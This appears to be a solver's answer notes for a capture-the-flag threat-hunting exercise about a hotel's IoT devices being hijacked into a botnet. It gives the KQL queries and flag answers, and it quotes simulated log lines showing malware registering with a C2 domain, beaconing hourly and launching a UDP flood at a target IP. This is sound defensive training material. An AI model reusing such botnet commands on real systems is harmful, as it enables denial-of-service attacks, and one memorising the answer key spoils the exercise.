@@ -1,0 +1,474 @@
+﻿/////////////////////Smart Hotel is Dumb
+10
+PTS
+Public warning siren
+▸
+Q1
+
+There were a couple alerts, a few days ago. They flew under the radar. Busy times. Understaffed. Stuff happens 🤷
+
+Better late than never, right? Maybe. You hope. You weren't the one on call that day, but those kind of details don't really matter in the grand scheme of things.
+
+Let's circle back to it now. The alerts fired on the 5th of February.
+
+Oof, they were rated high as well. Not a good look for the team 🫣
+
+What was the name of the alert?
+
+SecurityAlerts
+| where timestamp >=   datetime(2026-02-05)
+| where severity contains "high"
+
+//Trojan.IoTBot.PhantomGrid - This file matches a known malware signature. Verify the source and check for related activity.
+
+//Trojan.IoTBot.PhantomGrid
+
+
+SecurityAlerts
+| take 1
+
+1.2
+What is the filepath mentioned in the alert?
+
+SecurityAlerts
+| where description contains "Trojan.IoTBot.PhantomGrid"
+
+	"filepath": "/tmp/iot-update.bin",
+
+/tmp/iot-update.bin
+
+
+"hostname": "SmartTV-Backup",
+		"filepath": "/tmp/iot-update.bin",
+		"match_type": "sha256_hash"
+
+"hostname": "SmartTV-Gateway-3",
+		"filepath": "/tmp/iot-update.bin",
+		"match_type": "sha256_hash"
+
+
+
+        1.3
+
+  On how many devices does the file appear?
+
+FileCreationEvents
+| where path contains "iot-update.bin"
+| distinct hostname
+
+//28
+
+1.4
+
+Uh-ho. That's a little bit more than a couple devices. That is, in fact, all the IoT devices of the hotel 💀
+
+When did it first appear? (Paste the timestamp in the TZ format, ISO8601 in the ADX settings.)
+
+FileCreationEvents
+| where path contains "iot-update.bin"
+| order by timestamp asc
+
+///2026-02-05T03:33:12.000Z
+
+1.5
+
+The file started appearing almost three hours before the first alert! And kept popping up hours after the second alert.
+Maybe it was a regular update of the IoT devices then… 🤔?
+
+Let's see what we know about our devices. We keep a record of their details in the DeviceInfo table. We keep them separated in different VLANs according to their main function.
+
+Which VLAN contains the most devices?
+
+DeviceInfo
+| summarize Count=count() by vlan
+| sort by Count desc
+///room_iot
+
+2.1
+
+Every command executed on a machine will be found in the ProcessEvents table.
+If the file is indeed a nasty, you should see clear signs of it there.
+
+Let's keep it timebound on that same day for now.
+
+What is the name of the process involved in the execution of the commands you found?
+
+ProcessEvents
+| where timestamp >=   datetime(2026-02-05)
+| summarize Count=count() by process_name
+| sort by Count desc
+
+ProcessEvents
+| where timestamp >=   datetime(2026-02-05)
+///sh
+/tmp/iot-update.bin --register --c2=iot-botnet-c2.net
+
+A binary running from /tmp with a --register option pointing to a C2 domain is a strong indicator that a device may be joining a botnet. Treat it as a potential malware incident and investigate execution, persistence, and network communication.
+
+2.2
+
+That tracks, IoT devices often run on Linux, so commands would be run in a shell.
+
+The two commands at play here are pretty incriminating. The first one "registers" the device, linking it to a domain for control, while the other sets up the beaconing behaviour to said domain.
+
+What interval was provided for the beaconing?
+
+ProcessEvents
+| where timestamp >=   datetime(2026-02-05)
+
+/tmp/iot-update.bin --beacon --c2=iot-botnet-c2.net --interval=60
+
+//60
+
+3.3
+
+The destination of those commands is the most important piece of data here. It'll help you dig deeper, as well as validate that there is a connection between our network and the threat actor's infrastructure.
+
+What is the domain hardcoded in the commands?
+
+ProcessEvents
+| where timestamp >=   datetime(2026-02-05)
+
+/tmp/iot-update.bin --beacon --c2=iot-botnet-c2.net --interval=60
+
+//iot-botnet-c2.net
+
+3.4
+
+Time to pivot further by finding more information about the domain. Like an IP address. That would be golden, the missing key to dive into the network logs where only numbers exist (ugh, numbers 😒).
+
+The IoT devices will have had to resolve the domain, which means you should find some relevant DNS records.
+
+Which IP address did the domain resolve to?
+(side note from the creator: don't pay attention to the timestamps, data generation shenanigans)
+
+
+PassiveDns
+| where domain contains "iot-botnet-c2.net"
+| where rdata contains "185.203.116.45"
+
+//| distinct rdata
+
+//185.203.116.45
+
+
+registrar
+
+Namecheap
+Tucows
+Gandi
+Gandi
+Tucows
+
+
+2.5
+
+Now you can switch to the NetworkFlow table, where all the outgoing and incoming traffic is recorded.
+
+How many times did a connection happen to the threat actor's IP?
+
+NetworkFlow
+| where dest_ip contains "185.203.116.45"
+/// 113037
+
+2.6
+
+Let's do a neat little thing: a timechart. It'll allow us to visually see if the beaconing is consistent or not. Which should be the case, since the interval was hardcoded to one hour in the command.
+As you can see, the line is flat from start to almost finish. All 28 devices consistently beaconed out hourly.
+
+How many days did the beaconing last?
+
+NetworkFlow
+| where dest_ip == '185.203.116.45'
+| make-series beacon = count() on timestamp from datetime(2026-02-05T03:35:52.000Z) to datetime(2026-02-11T23:59:58.000Z) step 1h by src_ip
+| render timechart
+
+from datetime(2026-02-05)  to datetime(2026-02-11)
+//6 days
+
+3.1
+
+From the NetworkFlow data, you know the beaconing started and ended rather abruptly. Since no one on the team ever investigated the alerts, you doubt any of your colleague shut it down. Which can mean two things: the threat actor's network collapsed; or the threat actor got what it wanted and killed the botnet.
+
+Seeing where wishful thinking got you so far, let's explore the second option: what else could have happened?
+
+What type of attack is often performed using a botnet?
+
+////// distributed denial of service or  DDoS
+
+3.2
+
+If the hotel's IoT devices have been enslaved for this purpose, you will definitely find this noisy traffic in the NetworkFlow table. Let's keep it focused on that last day for now, the 11th.
+
+What is the IP address with the highest number of hits?
+
+
+
+
+NetworkFlow
+| where timestamp >= datetime(2026-02-11)
+| where timestamp < datetime(2026-02-12)
+| summarize TotalBytes=sum(bytes), Hits=count() by dest_ip
+| sort by TotalBytes desc
+| take 10
+
+45.95.147.236	20,767,390	14,325
+
+
+///Response   45.95.147.236
+
+
+3.3
+
+Over 14k in one single day!
+
+How many times total was that IP hit?
+
+NetworkFlow
+| where dest_ip contains "45.95.147.236"
+| summarize TotalBytes=sum(bytes), Hits=count() by dest_ip
+| sort by TotalBytes desc
+
+
+
+45.95.147.236	27,435,902	18,925
+
+///18,925
+
+3.4
+
+That- That's really a lot of traffic.
+
+When was the first connection made? (same as before, TZ format)
+
+NetworkFlow
+| where dest_ip contains "45.95.147.236"
+| summarize  FirstSeen=min( timestamp), LastSeen=max( timestamp), TotalBytes=sum(bytes), Hits=count() by dest_ip
+| sort by TotalBytes desc
+
+45.95.147.236	2/10/2026, 4:42:21 AM	2/11/2026, 11:56:20 PM	27,435,902	18,925
+
+
+///2026-02-10T04:42:21.000Z
+
+3.5
+
+It started early on the 10th and ended late on the 11th. That's two days. Two full days of connections made to a seemingly random address.
+
+Looking more closely, you can see the UDP connections were made in bursts, quite regularly. That's definitely the sign of a coordinated attack.
+
+How many 'bursts' were there?
+
+let StartTime = datetime(2026-02-10 00:00:00);
+let EndTime = datetime(2026-02-11 23:59:59);
+NetworkFlow
+| where timestamp between (StartTime .. EndTime)
+| where protocol contains "UDP"
+| where dest_ip contains "45.95.147.236"
+| distinct timestamp
+
+///757
+
+3.6
+
+The IoT devices didn't just happen to decide by themselves they were going to overwhelm that IP address. They've been commanded to.
+
+What is the full command that launched the attack?
+
+found which devices communicate with this IP "45.95.147.236"
+
+
+ProcessEvents
+| where process_commandline contains "45.95.147.236"
+| distinct process_commandline
+
+//Response
+
+/tmp/iot-update.bin --attack=udp --target=45.95.147.236 --port=80
+
+
+
+4.1
+
+You need to find out more about the threat actor infrastructure. One domain and one IP address won't cut it.
+
+Thankfully, you have access to more historical records via the PassiveDNS table. There you will be able to find any domains that were ever related to the beacon destination IP address, and vice-versa, any IP addresses that were ever related to the C2 domain.
+
+Which other domain in .net is linked to that IP?
+
+PassiveDns
+| where domain contains ".net" and rdata contains "185.203.116.45"
+| distinct domain
+
+//hotel-firmware-check.net
+
+
+4.2
+Let's pivot on those domains to find all the associated IP addresses.
+
+Which IP address is the longest?
+
+
+hotel-firmware-check.net
+iot-botnet-c2.net
+
+PassiveDns
+| where domain contains "iot-botnet-c2.net" or domain contains "hotel-firmware-check.net"
+| distinct rdata
+//116.184.156.238
+
+4.3
+
+
+Using all those IP addresses, we can go back to NetworkFlow to see if anything suspicious happened before the file even showed up on our devices.
+
+Which IP address repeatedly tried connecting to the IoT devices?
+
+PassiveDns
+| where domain contains "iot-botnet-c2.net" or domain contains "hotel-firmware-check.net"
+| distinct rdata
+
+116.184.156.238
+185.203.116.45
+226.252.11.2
+7.22.171.109
+91.219.237.102
+
+NetworkFlow
+| where dest_ip has_any ("116.184.156.238","185.203.116.45", "226.252.11.2", "7.22.171.109", "91.219.237.102")
+| summarize TotalBytes=sum(bytes), Hits=count() by dest_ip
+| sort by TotalBytes desc
+
+185.203.116.45 is well known
+
+Response below has the second highr totalbytes
+///7.22.171.109
+
+4.4
+
+We're missing some data here because of our timeframe, only 18 devices show up, but it's more than enough to infer what is going on 🕵️‍♀️
+
+How many ports were repeatedly scanned?
+
+
+first determin the 18 devices
+
+NetworkFlow
+| where dest_ip has_any ("7.22.171.109")
+| distinct src_ip
+
+//18 devices with dest_ip "7.22.171.109"
+
+find all port
+
+let A=
+NetworkFlow
+| where dest_ip has_any ("7.22.171.109")
+| distinct src_ip;
+NetworkFlow
+| where dest_ip  has_any (A)
+| summarize scan_count=count() by dest_port
+| order by scan_count desc
+
+dest_port
+
+80	18
+23	18
+22	18
+443	18
+554	18
+8,080	18
+8,443	18
+1,883	18
+8,883	18
+
+///9
+
+TCP/22 — SSH
+TCP/23 — Telnet
+TCP/80 — HTTP
+TCP/443 — HTTPS
+TCP/554 — RTSP (commonly cameras/IoT streaming)
+TCP/1883 — MQTT (IoT messaging)
+TCP/8080 — HTTP alternate port
+TCP/8443 — HTTPS alternate port
+TCP/8883 — Secure MQTT
+
+4.5
+
+The same ports, on all the devices… This was an automated TCP scan to do some reconnaissance on our network. This can easily be achieved with an open-source tool like nmap.
+
+Two of those ports are typical for IoT devices, one more secure than the other. Which protocol do they use?
+
+
+TCP/554 — RTSP (commonly cameras/IoT streaming)
+TCP/1883 — MQTT (IoT messaging)
+
+///MQTT
+
+TCP/1883 → MQTT (Message Queuing Telemetry Transport)
+A lightweight publish/subscribe messaging protocol widely used in IoT devices.
+
+4.6
+
+But that's not how the threat actor entered. That was just them knocking to see which doors were open.
+Once they knew this, they could do some research to figure out how to abuse the IoT devices. And it wasn't even that hard, in the end…
+
+To see how they managed to take control, you go to the AuthenticationEvents table. Your stomach drops. You know the answer before even looking.
+
+What are the first two words of the description for each and every login attempts?
+
+
+let A=
+NetworkFlow
+| where dest_ip has_any ("7.22.171.109")
+| distinct src_ip;
+let B=
+NetworkFlow
+| where dest_ip  has_any (A)
+| summarize scan_count=count() by dest_port;
+AuthenticationEvents
+| where src_ip   has_any (B)
+
+///Default credential
+
+The security_net vlan is for the security cameras and the employee's access panel.
+In the building_mgmt vlan are everything HVAC, energy and elevator related.
+Everything existing in the guest rooms are in room_iot, like the smart TVs from the alerts, but also the lighting and thermostat. And the smartlocks…
+
+So depending on what the iot_update.bin file actually does, it could be a very bad thing for the hotel reputation… A bad case scenario is customer data getting out 😱 (we all know smart TVs are spies #conspiracy). A worst case scenario is your colleagues and the guest being harmed (cooked to death by the thermostats, can you imagine 🫠).
+
+Type baked clients to finish this section.
+
+🧐 Note that beaconing is not in and of itself a suspicious behaviour for an IoT device. It is, in fact, perfectly normal.
+
+What makes it suspicious here, apart from the obvious domain name and commands, is the fact that all type of devices, regardless of their use, are beaconing to the same destination. A surveillance camera has nothing in common with a thermostat (it shouldn't anyway).
+
+This is why it is important to know about your network and the devices connected to it. It'll help you find the abnormal in a sea of seemingly innocent data.
+
+Type bacon would be better to carry on.
+
+Whelp, now we know for certain.
+
+The IoT devices were compromised, enrolled in a botnet, and used to perform a DDoS attack on an external IP that the hotel has absolutely nothing to do with. The boss isn't going to be happy. Legal is most likely to be getting involved. Oh dear 😵‍💫
+
+But before you report on your findings, there is one last thing to clarify… How did the threat actor get in in the first place!?
+
+Type knock-knock to enter the last section.
+
+You cry. It's okay. Let it all out. Here, have a tissue.
+
+Here is what happened, all in order:
+
+The threat actor scanned the network during the reconnaissance phase of their attack, and found our IoT network just sitting there, waiting patiently to be misused.
+The threat actor did some research and logged in into every device with default credentials.
+They dropped a file on the devices: it "enrolled" them into the botnet and started the beaconing pattern.
+When the threat actor was ready, they used the connection to the newly formed botnet to launch a DDoS attack against an unrelated IP address.
+It's okay. It could have been worse.
+But you have work to do to keep this from happening again… Changing the credentials would be a good start. Come on. Get to work.
+
+Type seven bot army to finish the module.
+
+
+
+The end
